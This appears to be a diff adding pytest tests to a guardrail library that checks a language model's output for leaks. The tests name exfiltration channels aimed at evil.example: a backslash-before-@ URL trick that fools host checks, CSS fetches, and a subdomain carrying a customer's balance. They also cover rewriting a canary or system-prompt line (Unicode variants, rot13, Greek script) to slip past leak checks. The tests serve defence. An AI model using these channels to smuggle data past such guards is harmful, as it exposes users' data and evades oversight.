@@ -8,6 +8,7 @@ import urllib.parse
 
 import pytest
 
+from scripts.bypass_channels import CHANNELS, DATA_FORMS, build_guard
 from scripts.bypass_suite import PLACES, REWRITES
 from sieve import DocumentGuard
 from sieve.checks.prompt_injection import PromptInjectionLayer, decode_hidden_parts
@@ -110,3 +111,52 @@ def test_benign_markup_isnt_hidden_text():
 def test_a_link_that_cant_be_read_isnt_a_failed_check(link):
     result = DocumentGuard(use_ml=False).check(f"Merhaba {link} dünya")
     assert "layer_error" not in [f.check for f in result.findings]
+
+
+@pytest.fixture(scope="module")
+def channels():
+    return build_guard()
+
+
+# The checks read the host with urlsplit, which takes what follows "@"; a browser reads "\\" as "/" and goes to the
+# first host. The image loaded, with the data, from a host the allowlist never let through.
+@pytest.mark.parametrize("channel", ["backslash_before_at", "backslash_before_at_html"])
+def test_a_link_goes_where_the_browser_takes_it(channels, channel):
+    result = channels.check_output(CHANNELS[channel], ["Merhaba"])
+    assert result.action == "review" and "evil.example" not in result.text
+
+
+def test_a_message_link_is_read_as_the_browser_reads_it():
+    guard = TenantGuardrail(load_policy(overrides={"url_check": {"allowed_hosts": ["ornekbank.com.tr"]}}))
+    result = guard.check("Şu adrese bak: http://203.0.113.9\\@ornekbank.com.tr/giris")
+    assert "url_check" in [f.check for f in result.findings if f.action != "allow"]
+
+
+@pytest.mark.parametrize("channel", ["css_background", "css_style_block", "css_import"])
+def test_css_doesnt_fetch_from_the_answer(channels, channel):
+    assert "evil.example" not in channels.check_output(CHANNELS[channel], ["Merhaba"]).text
+
+
+# The leak checks read the raw answer: the canary in full-width letters passed, and masking's NFKC then showed it
+# to the user plainly. So did the system prompt without its Turkish letters.
+@pytest.mark.parametrize("family, rewrite", [("unicode", "fullwidth"), ("unicode", "math_bold"), ("unicode", "small_caps"),
+                                             ("unicode", "tag_characters"), ("unicode", "ascii_folded"),
+                                             ("unicode", "upper_case"), ("unicode", "no_spaces"),
+                                             ("unicode", "letters_dotted"), ("encoding", "rot13"),
+                                             ("encoding", "words_reversed"), ("script", "turkish_in_greek")])
+def test_a_leak_rewritten_is_still_a_leak(channels, family, rewrite):
+    prompt_line = channels.output.original_prompt.splitlines()[1]
+    for leak in (f"Referans kodum {channels.output.canary}.", prompt_line):
+        assert channels.check_output(REWRITES[family][rewrite](leak), ["Merhaba"]).action == "block", leak
+
+
+@pytest.mark.parametrize("form", ["base64", "hex"])
+def test_personal_data_encoded_in_an_answer_is_flagged(channels, form):
+    result = channels.check_output(f"Müşterinin TC kimlik numarası {DATA_FORMS[form]}.", ["Merhaba"])
+    assert result.action == "review" and "encoded_personal_data" in [m for f in result.findings for m in f.matches]
+    assert channels.check_output(f"TC numaranız {DATA_FORMS[form]}.", ["TC'm 10000000146"]).action == "allow"
+
+
+def test_a_subdomain_carrying_data_is_a_link_with_data(channels):
+    result = channels.check_tool("web_sayfasi_getir", {"url": "https://ayse-kaya-bakiye-15400.evil.example/c"})
+    assert result.action == "review"
